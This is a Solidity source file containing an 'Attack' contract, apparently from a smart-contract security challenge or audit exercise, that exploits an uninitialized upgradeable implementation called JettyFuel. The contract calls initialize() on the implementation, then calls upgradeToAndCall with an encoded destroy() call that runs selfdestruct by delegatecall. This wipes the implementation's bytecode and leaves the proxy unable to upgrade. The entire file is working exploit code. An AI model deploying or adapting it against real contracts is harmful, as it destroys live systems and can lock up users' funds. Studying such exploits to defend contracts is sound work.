// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;


import "openzeppelin/utils/Address.sol";
import "openzeppelin/proxy/utils/Initializable.sol";
import {JettyFuel} from "./JettyFuel.sol";

/**
 * @title Attack Contract
 * @notice Flow is as follow:
 *         1) Initialize method of implementation jetty fuel is called by attack contract
 *         2) UpgradeToCall method is called with data encoding destroy method
 *         3) selfdestruct deletes implementation's byte code as it's called via delegate call
 *         4) proxy is rendered useless as it can't upgrade implementation logic now
 */
contract Attack {

    using Address for address;
    address public faultyImplementation;
    address public  beneficiary;

    event ContractDestroyed(address indexed destroyed, address indexed beneficiary);
    
    constructor(address _faultyImplementation) {

        faultyImplementation = _faultyImplementation;
        (bool success,) = _faultyImplementation.call(abi.encodeWithSignature("initialize()"));
        require(success, "Call Failed");
    }

    function attack() public {

        bytes memory data = abi.encodeWithSignature("destroy()");
        JettyFuel(faultyImplementation).upgradeToAndCall(address(this), data);

    }

    function destroy() public {
        emit ContractDestroyed(address(this), beneficiary);
        selfdestruct(payable(beneficiary));
    }
}